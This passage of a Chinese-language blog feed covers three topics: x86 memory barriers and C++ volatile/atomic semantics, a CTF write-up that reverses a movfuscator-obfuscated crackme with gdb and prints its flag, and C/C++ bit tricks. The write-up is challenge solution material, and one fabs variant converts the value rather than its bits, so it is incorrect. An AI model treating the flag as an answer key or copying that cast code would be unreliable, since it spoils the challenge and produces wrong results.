keyword">volatile</span><span class="token punctuation">(</span><span class="token function">ALTERNATIVE</span><span class="token punctuation">(</span></span><span class="token string">"lock; addl $0,-4(%%esp)"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">"sfence"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token punctuation">\</span>       <span class="token expression">X86_FEATURE_XMM2<span class="token punctuation">)</span> <span class="token operator">::</span><span class="token operator">:</span> </span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token string">"cc"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">__mb</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span></span><span class="token string">"mfence"</span><span class="token expression"><span class="token operator">::</span><span class="token operator">:</span></span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">__rmb</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span></span><span class="token string">"lfence"</span><span class="token expression"><span class="token operator">::</span><span class="token operator">:</span></span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">__wmb</span><span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span></span><span class="token string">"sfence"</span> <span class="token expression"><span class="token operator">::</span><span class="token operator">:</span> </span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>https://elixir.bootlin.com/linux/v6.1.7/source/arch/x86/include/asm/barrier.h</p><p>https://github.com/torvalds/linux/blob/master/arch/x86/include/asm/barrier.h</p></blockquote><h2 id="c-内存序">C++ 内存序</h2><p>C++ 六种内存序其实就指定了四种一致性模型，即：</p><ul><li>sequentially-consistent</li><li>acquire-release</li><li>consume-release</li><li>relaxed</li></ul><p>分别通过施加不同的内存序来实现不同的一致性模型，且最弱的一致性模型为硬件提供的模型，即使用的一致性模型=min（内存序指定，硬件指定）。举个例子X86本身就是acquire-release模型，再怎么写其都不可能出现relaxed的语义。</p><h2 id="c-关键字">C++ 关键字</h2><p>C++ 中的 <code>volatile</code> 关键字，<code>std::atomic</code>变量及手动插入内存屏障指令（MemoryBarrier）均是为了避免内存访问过程中出现一些不符合预期的行为。这三者的作用有些相似之处，不过显然它们并不相同，本文就将对这三者的应用场景做一总结。</p><p>这三者应用场景的区别可以用一张表来概括：</p><table><thead><tr class="header"><th style="text-align: center;"></th><th style="text-align: center;"><code>volatile</code></th><th style="text-align: center;">Memory Barrier</th><th style="text-align: center;"><code>atomic</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">抑制编译器重排</td><td style="text-align: center;">Yes</td><td style="text-align: center;">Yes</td><td style="text-align: center;">Yes</td></tr><tr class="even"><td style="text-align: center;">抑制编译器优化</td><td style="text-align: center;">Yes</td><td style="text-align: center;">No</td><td style="text-align: center;">Yes</td></tr><tr class="odd"><td style="text-align: center;">抑制 CPU 乱序</td><td style="text-align: center;">No</td><td style="text-align: center;">Yes</td><td style="text-align: center;">Yes</td></tr><tr class="even"><td style="text-align: center;">保证访问原子性</td><td style="text-align: center;">No</td><td style="text-align: center;">No</td><td style="text-align: center;">Yes</td></tr></tbody></table><p>下面来具体看一下每一条。</p><h3 id="抑制编译器重排">抑制编译器重排</h3><p>所谓编译器重排，这里是指编译器在生成目标代码的过程中交换没有依赖关系的内存访问顺序的行为。</p><p>比如以下代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">*</span>p_a <span class="token operator">=</span> a<span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token operator">*</span>p_b<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编译器<strong>不保证</strong>在最终生成的汇编代码中对<code>p_a</code> 内存的写入在对 <code>p_b</code> 内存的读取之前。</p><p>如果这个顺序是有意义的，就需要用一些手段来保证编译器不会进行错误的优化。具体来说可以通过以下三种方式来实现：</p><ul><li>把对应的变量声明为 <code>volatile</code> 的，C++ 标准保证对<code>volatile</code> 变量间的访问编译器不会进行重排，不过仅仅是<code>volatile</code> 变量之间， <code>volatile</code>变量和其他变量间还是有可能会重排的；</li><li>在需要的地方手动添加合适的 Memory Barrier 指令，Memory Barrier指令的语义保证了编译器不会进行错误的重排操作；</li><li>把对应变量声明为 <code>atomic</code> 的， 与 <code>volatile</code>类似，C++ 标准也保证 <code>atomic</code>变量间的访问编译器不会进行重排。不过 C++ 中不存在所谓的 “atomic pointer”这种东西，如果需要对某个确定的地址进行 atomic操作，需要靠一些技巧性的手段来实现，比如在那个地址上进行 placement new操作强制生成一个 <code>atomic</code> 等；</li></ul><h3 id="抑制编译器优化">抑制编译器优化</h3><p>此处的编译器优化特指编译器不生成其认为无意义的内存访问代码的优化行为，比如如下代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    a <span class="token operator">+=</span> i<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在较高优化级别下对变量 <code>a</code>的内存访问基本都会被优化掉，<code>f()</code>生成的汇编代码和一个空函数基本差不多。然而如果对 <code>a</code>循环若干次的内存访问是有意义的，则需要做一些修改来抑制编译器的此优化行为。可以把对应变量声明为<code>volatile</code> 或 <code>atomic</code> 的来实现此目的，C++标准保证对 <code>volatile</code> 或 <code>atomic</code>内存的访问肯定会发生，不会被优化掉。</p><p>不过需要注意的是，这时候手动添加内存屏障指令是没有意义的，在上述代码的<code>for</code> 循环中加入 <code>mfence</code>指令后，仅仅是让循环没有被优化掉，然而每次循环中对变量 <code>a</code>的赋值依然会被优化掉，结果就是连续执行了 1000 次<code>mfence</code>。</p><h3 id="抑制-cpu-乱序">抑制 CPU 乱序</h3><p>上面说到了编译器重排，那没有了编译器重排内存访问就会严格按照我们代码中的顺序执行了么？非也！现代CPU 中的诸多特性均会影响这一行为。对于不同架构的 CPU来说，其保证的内存存储模型是不一样的，比如 x86_64 就是所谓的TSO（完全存储定序）模型，而很多 ARM 则是RMO（宽松存储模型）。再加上多核间 Cache一致性问题，多线程编程时会面临更多的挑战。</p><p>为了解决这些问题，从根本上来说只有通过插入所谓的 Memory Barrier内存屏障指令来解决，这些指令会使得 CPU保证特定的内存访问序及内存写入操作在多核间的可见性。然而由于不同处理器架构间的内存模型和具体Memory Barrier指令均不相同，需要在什么位置添加哪条指令并不具有通用性，因此 C++ 11在此基础上做了一层抽象，引入了 <code>atomic</code> 类型及 Memory Order的概念，有助于写出更通用的代码。从本质上看就是靠编译器来根据代码中指定的高层次Memory Order来自动选择是否需要插入特定处理器架构上低层次的内存屏障指令。</p><p>关于 MemoryOrder，内存模型，内存屏障等东西的原理和具体使用方法网上已经有很多写得不错的文章了，可以参考文末的几篇参考资料。</p><h3 id="保证访问原子性">保证访问原子性</h3><p>所谓访问原子性就是 Read，Write操作是否存在中间状态，具体如何实现原子性的访问与处理器指令集有很大关系，如果处理器本身就支持某些原子操作指令，如Atomic Store， Atomic Load，Atomic Fetch Add，Atomic Compare AndSwap（CAS）等，那只需要在代码生成时选择合适的指令即可，否则需要依赖锁来实现。C++中提供的可移植通用方法就是<code>std::atomic</code>，<code>volatile</code> 及 Memory Barrier均与此完全无关。</p><h3 id="aio">AiO</h3><p>从上面的比较中可以看出，<code>volatile</code>，<code>atomic</code> 及Memory Barrier 的适用范围还是比较好区分的。</p><ul><li>如果需要原子性的访问支持，只能选择 <code>atomic</code>；</li><li>如果仅仅只是需要保证内存访问不会被编译器优化掉，优先考虑<code>volatile</code>；</li><li>如果需要保证 Memory Order，也优先考虑<code>atomic</code>，只有当不需要保证原子性，而且很明确要在哪插入内存屏障时才考虑手动插入Memory Barrier。</li></ul><h2 id="参考">参考</h2><ul><li>https://taoste.github.io/dirtysalt/html/memory-barrier.html</li><li><a href="https://mariadb.org/wp-content/uploads/2017/11/2017-11-Memory-barriers.pdf">MariaDB中的内存屏障</a></li><li><a href="https://zhuanlan.zhihu.com/p/96001570">对优化说不 -Linux中的Barrier</a></li><li><a href="https://blog.51cto.com/u_15703183/5464436">浅谈内存屏障，C++内存序与内存模型</a></li><li><a href="https://www.huliujia.com/blog/f85f72a3b3e3018ffe9c9d3c15dda0f5db079859/">内存乱序与C++内存模型详解</a></li><li><a href="https://gaomf.cn/2020/09/11/Cpp_Volatile_Atomic_Memory_barrier/">C++中的 volatile，atomic 及 memory barrier</a></li><li><a href="https://zhuanlan.zhihu.com/p/41872203">X86/GCC memoryfence的一些见解</a></li><li><a href="https://sf-zhou.github.io/programming/memory_barrier.html">内存屏障和内存模型</a></li><li><a href="https://zhuanlan.zhihu.com/p/43526907">volatile与内存屏障总结</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mov 汇编指令混淆</title>
      <link href="/2023/01/16/mov-hui-bian-zhi-ling-hun-yao/"/>
      <url>/2023/01/16/mov-hui-bian-zhi-ling-hun-yao/</url>
      
        <content type="html"><![CDATA[<h1 id="mov">mov</h1><p>这个程序拿来初看可能比较乏味，但也很有趣。马后炮地说，多用一点脚本就会轻松很多，因为在调试时做了很多繁琐的工作。</p><h3 id="运行程序">运行程序</h3><p>我们得到一个名为 <code>mov</code>的二进制文件。容易看出，这个二进制文件是用名为"movfuscator"（https://github.com/xoreaxeaxeax/movfuscator）的混淆器编译的，（因为笔者之前看到过movfuscator）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./mov hellohelloNope sorry :<span class="token punctuation">(</span>$ <span class="token builtin class-name">echo</span> <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> ./movAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��Nope sorry :<span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看来，我们的输入被放在一个长度为32的缓冲区里。在开始逆向之前，先对它进行解密。</p><h3 id="去混淆">去混淆</h3><p>Google 了一下，发现了反混淆器：Demovfuscator(https://github.com/kirschju/demovfuscator).</p><pre class="line-numbers language-none"><code class="language-none">Usage: demov [-o patched] [-g graph] [-i idc]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Demovfuscator 不会移除所有的 mov 操作！</strong></p><p>它只能做到以下几点：</p><ul><li>处理加固的二进制文件</li><li>重构函数和它们的控制流图</li><li>为 IDA 生成符号</li><li>产生一个经过修补的二进制文件</li><li>进行部分指令的重新替换</li></ul><p>-&gt; 方便逆向</p><h3 id="静态调试">静态调试</h3><p>在IDA中观察了一段时间的二进制文件后，我们注意到有一堆</p><p><code>test eax, eax</code> 指令之后是</p><p><code>jne 0x0804XXXX</code></p><h3 id="分析控制流">分析控制流</h3><p>生成一张控制流图</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://github.com/happysox/CTF_Writeups/raw/master/RITSEC_CTF_2018/mov/pics/cfg.png"></p><p>我们看到这里，可以怀疑二进制每次都是对输入的一个或几个字符进行比较。</p><h3 id="battle-plan">Battle plan</h3><p>如果我们一次发送一个唯一的字符的话，就能看到字符被 check的顺序。构造输入：</p><pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZ012345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们创建了一个gdbinit文件，在.png中提到的每一个ADDRESS（共42个）设置断点，然后运行程序。</p><h3 id="调试">调试</h3><p>我们注意到在指令 <code>0x804be37</code>后不久，字符开始被引用。看一下我们的流图，这看起来像是一个循环。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/happysox/CTF_Writeups/master/RITSEC_CTF_2018/mov/pics/loop1.png"></p><p>第一个被引用的字符是'G'。同时，'_'也被引用。这两个字符被多次放在<code>eax</code>和<code>edx</code>中。再往下，和前面一样，我们遇到了一个<code>test eax, eax</code>，然后是一个<code>jne</code>/<code>jnz</code>。正是这个跳转导致了<code>Nope sorry :(</code>被打印出来，程序中途终止。</p><p>所以我们在'G'和'_'都在寄存器内的地方打一个断点，相应地修改我们的输入字符串并继续。最终获得字符串。</p><pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZ012345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-&gt; </p><pre class="line-numbers language-none"><code class="language-none">ABCDEF_HIJKL_NOPQ_STU_WX_Z012345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre> 看着像 flag 了吧。<p></p><p><strong>在循环之后继续</strong>，我们看到的是看起来更像if语句而不是循环条件。换句话说，这个过程在一个基本块中比较一个或多个字符，然后继续到程序的下一个部分。</p><p>当程序开始引用两个以上的字符串时，会难一些。在<code>0x080513e7</code>处，程序似乎要检查我们的第9个字符（<code>I</code>）减去<code>8</code>后是否等于<code>j</code>。这意味着我们的字符实际上应该是<code>r</code>。</p><h3 id="解决">解决</h3><p>按照上面的解释，步入程序的过程相当顺利。有些条件我们无法满足（这就是为什么我们应该编写解决方案的脚本！），所以我们最后手动引导程序向正确的方向发展（<code>set $eip=0xcorrect</code>），以避免程序终止。</p><p>最后东拼西凑：</p><p><code>MBkeys_breKt_tObt_bad_:)_!012345</code></p><p>可见其原本是</p><p><code>Mykeys_arent_that_bad_:)_!</code> 然后包上flag提交！</p><p>Flag: <code>flag{Mykeys_arent_that_bad_:)_!}</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些C/C++位运算优化</title>
      <link href="/2023/01/16/yi-xie-c-c-wei-yun-suan-you-hua/"/>
      <url>/2023/01/16/yi-xie-c-c-wei-yun-suan-you-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="cc-位运算">C/C++ 位运算</h1><h2 id="得到一个二进制数的最高有效位">得到一个二进制数的最高有效位</h2><h3 id="等价问题">等价问题</h3><ul><li>获取比一个数小的最大2的次幂</li><li>exp(int(log2(x)), 2)</li><li>Calculates the smallest integral power of two that is not smallerthan x.</li></ul><h3 id="可能方法">可能方法</h3><ul><li>把自然数均匀map到0~1（单向就行</li><li>写个 naive approach 然后交给 compiler</li><li>查表</li><li>bitset 一直把 lowbit 去除</li><li><code>__builtin_clz</code></li></ul><p>GCC有内建函数<code>__builtin_clz</code>（clz表示Count LeadingZeros，统计前导零个数），可以直接使用：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token function">msb</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">31</span> <span class="token operator">-</span> <span class="token function">__builtin_clz</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当然，<code>unsigned</code>类型的大小依赖于平台，并不一定占32个bit，所以更好的写法是：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;limits.h&gt;</span></span><span class="token keyword">unsigned</span> <span class="token function">msb</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token operator">*</span> CHAR_BIT <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token function">__builtin_clz</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__builtin_clz</code>当参数为0时结果未定义，所以上面这个函数在参数为0时结果也未定义，使用时需要特判。不过，如果希望<code>msb(0)</code>的结果为0，可以简单地用<code>x|1</code>代替原来的<code>x</code>，不会影响其他结果。</p><p>除了<code>__builtin_clz</code>外，还有<code>__builtin_clzl</code>和<code>__builtin_clzll</code>，分别对应参数为<code>unsigned long</code>和<code>unsigned long long</code>的情形。</p><p>关于速度，将上面的代码使用x86-64 gcc10.2编译，开<code>-O2</code>后生成代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">msb<span class="token operator">:</span>        bsr     edi<span class="token punctuation">,</span> edi        mov     eax<span class="token punctuation">,</span> <span class="token number">31</span>        xor     edi<span class="token punctuation">,</span> <span class="token number">31</span>        sub     eax<span class="token punctuation">,</span> edi        ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现原理主要是使用了<code>bsr</code>（Bit ScanReverse，逆向位扫描）这个指令，这是Intel 80386后引入的指令，它的作用是[1](https://www.zhihu.com/question/35361094/answer/1648676503#ref_1)：</p><blockquote><p>Scans source operand for first bit set. Sets ZF if a bit is found setand loads the destination with an index to first set bit. Clears ZF isno bits are found set. BSF scans forward across bit pattern (0-n) whileBSR scans in reverse (n-0).</p></blockquote><p>即从高位到低位扫描源操作数的二进制位，如果没有找到1，则将标志位ZF设为0；如果找到了，则把标志位ZF设为1，且将第一个1所在的位序号传入目的操作数。另一个指令<code>bsf</code>（BitScan Forward，前向位扫描）与它类似，只不过方向是从低位到高位。</p><p>这个方法可以认为是O(1)的，而且效率比<code>log2</code> 高很多。</p><p>其实C++中可以直接用<code>std::__lg</code>来实现前面提到的功能，编译出来也是一样的：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bitset&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;climits&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token function">msb</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token operator">*</span> CHAR_BIT <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token function">__builtin_clz</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">auto</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">int</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> x<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token function">msb</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stdbit_ceil">std::bit_ceil</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bit&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bitset&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span> <span class="token keyword">auto</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token comment">// :()</span><span class="token punctuation">{</span>    <span class="token keyword">using</span> bin <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span>bitset<span class="token operator">&lt;</span><span class="token number">8</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> x <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>x<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">unsigned</span> <span class="token keyword">const</span> z <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">bit_ceil</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// `ceil2` before P1956R1</span>         std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"bit_ceil( "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">bin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" ) = "</span> <span class="token operator">&lt;&lt;</span> <span class="token function">bin</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token char">'\n'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Output:</p><pre class="line-numbers language-none"><code class="language-none">bit_ceil( 00000000 ) = 00000001bit_ceil( 00000001 ) = 00000001bit_ceil( 00000010 ) = 00000010bit_ceil( 00000011 ) = 00000100bit_ceil( 00000100 ) = 00000100bit_ceil( 00000101 ) = 00001000bit_ceil( 00000110 ) = 00001000bit_ceil( 00000111 ) = 00001000bit_ceil( 00001000 ) = 00001000bit_ceil( 00001001 ) = 00010000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>https://en.cppreference.com/w/cpp/numeric/bit_ceil</p></blockquote><h2 id="单双浮点数取绝对值">单/双浮点数取绝对值</h2><h3 id="ieee-754">IEEE-754</h3><blockquote><p>https://googles.plus/2021/11/13/ieee-754-xue-xi-bi-ji/</p></blockquote><p>根据 IEEE-754标准，sign-bit（符号位）决定了一个浮点数的正负，这里我们使用几种方式进行掩码取绝对值。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdint&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iomanip&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token keyword">constexpr</span> <span class="token keyword">uint64_t</span> mask <span class="token operator">=</span> <span class="token number">0x7fffffffffffffff</span><span class="token punctuation">;</span><span class="token keyword">constexpr</span> <span class="token keyword">double</span>   d1   <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3.1415926</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// std::cout &lt;&lt; "-----------------------" &lt;&lt; std::endl;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>fixed <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span><span class="token function">setprecision</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token function">func</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"-----------------------"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">double</span> <span class="token function">c_dynamic_cast</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span><span class="token punctuation">)</span> x<span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">double</span> <span class="token function">cpp_static_cast</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">static_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">uint64_t</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">double</span> <span class="token function">ptr_cast_fabs</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span> <span class="token operator">&amp;=</span> mask<span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">double</span> <span class="token function">reinterprete_cast_fabs</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token generic-function"><span class="token function">reinterpret_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">double</span> <span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token generic-function"><span class="token function">reinterpret_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">uint64_t</span> <span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span> <span class="token operator">&amp;=</span> mask<span class="token punctuation">,</span> <span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">double</span> <span class="token function">type_pun_fabs</span><span class="token 